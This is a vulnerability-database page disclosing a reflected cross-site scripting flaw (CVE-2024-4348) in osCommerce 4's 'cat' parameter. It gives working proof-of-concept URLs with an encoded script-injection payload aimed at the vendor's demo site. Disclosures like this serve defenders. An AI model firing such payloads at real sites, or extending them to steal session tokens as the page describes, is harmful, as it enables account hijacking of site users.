---
title: osCommerce 4 - Reflected XSS
url: https://cxsecurity.com/issue/WLB-2024050002
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2024-05-02
fetch_date: 2025-10-06T17:14:47.206764
---

# osCommerce 4 - Reflected XSS

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **osCommerce 4 - Reflected XSS** **2024.05.01**  **![lb](https://cert.cx/cxstatic/images/flags/lb.png) [CraCkEr](https://cxsecurity.com/author/CraCkEr/1/) **(LB)** ![lb](https://cert.cx/cxstatic/images/flags/lb.png)**  Risk: **Low**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2024-4348](https://cxsecurity.com/cveshow/CVE-2024-4348/ "Click to see CVE-2024-4348")**  CWE: **[CWE-79 - CWE-74 - CWE-707](https://cxsecurity.com/cwe/CWE-79%20-%20CWE-74%20-%20CWE-707 "Click to see CWE-79 - CWE-74 - CWE-707")** | |

# Exploit Title: osCommerce 4 - Reflected XSS
# Exploit Author: CraCkEr
# Date: 22/04/2024
# Vendor: osCommerce ltd.
# Vendor Homepage: https://www.oscommerce.com/
# Software Link: https://demo.oscommerce.com/
# Demo Link: https://demo.oscommerce.com/furniture/
# Tested on: Windows 11 Pro
# Impact: Manipulate the content of the site
# CVE: CVE-2024-4348
# VDB: VDB-262488
# CWE: CWE-79 / CWE-74 / CWE-707
# CAPEC: CAPEC-10 / CAPEC-209 / CAPEC-250
# ATT&CK: T1059.007
## Description
Attacker can send to victim a link containing a malicious URL in an email or instant message
can perform a wide variety of actions, such as stealing the victim's session token or login credentials
GET parameter 'cat' is vulnerable to RXSS
Path: /furniture/catalog/all-products
https://demo.oscommerce.com/furniture/catalog/all-products?cat=[XSS]
https://demo.oscommerce.com/watch/catalog/all-products?cat=[XSS]
## Live POC:
https://demo.oscommerce.com/furniture/catalog/all-products?cat=1&bhl4n%2522%253e%253cScRiPt%253ealert%25281%2529%253c%252fScRiPt%253eiyehb=1
https://demo.oscommerce.com/watch/catalog/all-products?cat=1&bhl4n%2522%253e%253cScRiPt%253ealert%25281%2529%253c%252fScRiPt%253eiyehb=1
[-] Done

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2024050002)

[Tweet](https://twitter.com/share)

Vote for this issue:
 1
 0

100%

0%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top